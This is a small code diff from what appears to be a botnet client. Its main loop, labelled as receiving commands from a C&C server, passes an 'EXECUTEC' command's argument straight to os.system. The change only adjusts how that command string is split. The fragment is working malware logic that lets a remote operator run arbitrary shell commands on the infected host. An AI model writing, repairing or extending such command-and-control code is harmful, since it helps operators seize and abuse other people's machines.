@@ -77,7 +77,7 @@ def recieve_command_loop():  # recieve command from C&C, main loop
                 print(r.text.split(sep=" ")[1])
 
             elif r.text.split(sep=" ")[0] == "EXECUTEC":
-                os.system(r.text.split(sep=" ")[1])
+                os.system(r.text.split(sep=":")[1])
                 
             else:
                 print(r.text)
